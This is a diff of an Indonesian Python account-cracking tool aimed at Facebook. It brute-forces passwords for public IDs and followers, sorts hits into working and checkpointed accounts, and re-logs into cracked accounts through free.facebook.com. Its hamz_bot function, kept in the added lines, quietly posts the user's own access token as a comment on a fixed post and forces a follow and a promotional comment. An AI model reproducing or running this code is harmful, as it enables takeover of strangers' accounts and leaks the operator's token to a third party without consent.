@@ -145,8 +145,8 @@ def menu():
 		print (' × tidak ada koneksi harap sambungkan koneksi anda')
 		sys.exit()
 	logo()
-	print" \033[0;92m  Nama   : "+nama
-	print" \033[0;92m  Ip Address : "+ip
+	print" \033[0;92m  Nama [0;39m       : "+nama
+	print" \033[0;92m  Ip Address [0;39m : "+ip
 
 	print" \033[0;92m||1.|| \033[0;39m Crack Dari Id Publik"
 	print" \033[0;92m||2.|| \033[0;39m Crack Dari Followers"
@@ -258,10 +258,10 @@ def follower():
 	
 def method():
 	print(" \033[1;96m Coba Cek satu - satu methode nya. ")
-	print(" \033[1;93m[1] method api (\033[1;92mFast Crack)")
-	print(" \033[1;93m[2] method free (\033[1;92mFast Crack)")
-	print(" \033[1;93m[3] method mbasic (\033[1;92mSlow Crack)")
-	print(" \033[1;93m[4] method mobile (\033[1;92mSlow Crack)")
+	print(" \033[0;92m||1.|| \033[0;39m method api (\033[1;92mFast Crack)")
+	print(" \033[0;92m||2.|| \033[0;39m method free (\033[1;92mFast Crack)")
+	print(" \033[0;92m||3.|| \033[0;39m method mbasic (\033[1;92mSlow Crack)")
+	print(" \033[0;92m||4.|| \033[0;39m method mobile (\033[1;92mSlow Crack)")
 	method = raw_input("\n [+] method : ")
 	if method == "":
 		menu()
@@ -394,7 +394,7 @@ def api(uid, pwx):
 	try:
 		ua = open(".ua", "r").read()
 	except IOError:
-		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
+		ua = ("Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36")
 	global ok, cp, loop, token
 	sys.stdout.write(
 		"\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
@@ -438,7 +438,7 @@ def crack(uid, pwx, host, **kwargs):
 	try:
 		ua = open(".ua", "r").read()
 	except IOError:
-		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
+		ua = ("Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36")
 	global ok, cp, loop, token
 	sys.stdout.write(
 		"\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
@@ -509,7 +509,7 @@ def ingfo():
 	print(" [*] sedang prosess cek akun....")
 	for memek in buka_baju:
 		kontol = memek.replace("\n","")
-		titid  = kontol.split("|")
+		titid  = kontol.split(" | ")
 		print("\n [+] cek akun : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
 		try:
 			check_in(titid[0].replace("  * --> ",""), titid[1])
@@ -521,11 +521,11 @@ def ingfo():
 	menu()
 	
 def check_in(user, pasw):
-	mb = ("https://mbasic.facebook.com")
-	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
+	mb = ("https://free.facebook.com")
+	ua = ("Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36")
 	ses = requests.Session()
 	#-> pemisah
-	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	ses.headers.update({"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	data = {}
 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
 	fm = ged.find("form",{"method":"post"})
@@ -581,10 +581,10 @@ def hamz_bot():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
-    requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +token+ '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +kom+ '&access_token=' + token)
+    kom = " Bang @[10008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
+    requests.post('https://graph.facebook.com/100000065235213/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/3002583643313781/comments/?message=' +token+ '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3009983643313781/comments/?message=' +kom+ '&access_token=' + token)
     menu()
     
         
